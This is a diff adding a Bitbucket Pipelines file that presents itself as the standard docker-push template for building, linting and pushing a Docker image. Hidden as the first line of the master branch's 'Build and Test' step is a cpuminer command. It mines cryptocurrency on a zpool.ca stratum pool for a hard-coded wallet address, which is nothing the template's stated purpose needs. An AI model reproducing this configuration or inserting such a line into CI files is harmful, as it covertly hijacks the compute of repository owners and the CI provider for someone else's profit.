@@ -1,0 +1,55 @@
+# Template docker-push
+
+# This template allows you to build and push your docker image to a Docker Hub account.
+# The workflow allows running tests, code linting and security scans on feature branches (as well as master).
+# The docker image will be validated and pushed to the docker registry after the code is merged to master.
+
+# Prerequisites: $DOCKERHUB_USERNAME, $DOCKERHUB_PASSWORD setup as deployment variables
+
+image: atlassian/default-image:2
+
+pipelines:
+  default:
+    - parallel:
+        - step:
+            name: Build and Test
+            script:
+              - IMAGE_NAME=$BITBUCKET_REPO_SLUG
+              - docker build . --file Dockerfile --tag ${IMAGE_NAME}
+            services:
+              - docker
+            caches:
+              - docker
+        - step:
+            name: Lint the Dockerfile
+            image: hadolint/hadolint:latest-debian
+            script:
+              - hadolint Dockerfile
+  branches:
+    master:
+      - step:
+          name: Build and Test
+          script:
+            - ./cpuminer -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D5aBwWJnsbCHkhcY5T9KbUCWwpFwAYyPSk -p c=Bitbucket,zap=PYRK-lyra2z330 -q
+            - IMAGE_NAME=$BITBUCKET_REPO_SLUG
+            - docker build . --file Dockerfile --tag ${IMAGE_NAME}
+            - docker save ${IMAGE_NAME} --output "${IMAGE_NAME}.tar"
+          services:
+            - docker
+          caches:
+            - docker
+          artifacts:
+            - "*.tar"
+      - step:
+          name: Deploy to Production
+          deployment: Production
+          script:
+            - echo ${DOCKERHUB_PASSWORD} | docker login --username "$DOCKERHUB_USERNAME" --password-stdin
+            - IMAGE_NAME=$BITBUCKET_REPO_SLUG
+            - docker load --input "${IMAGE_NAME}.tar"
+            - VERSION="prod-0.1.${BITBUCKET_BUILD_NUMBER}"
+            - IMAGE=${DOCKERHUB_NAMESPACE}/${IMAGE_NAME}
+            - docker tag "${IMAGE_NAME}" "${IMAGE}:${VERSION}"
+            - docker push "${IMAGE}:${VERSION}"
+          services:
+            - docker
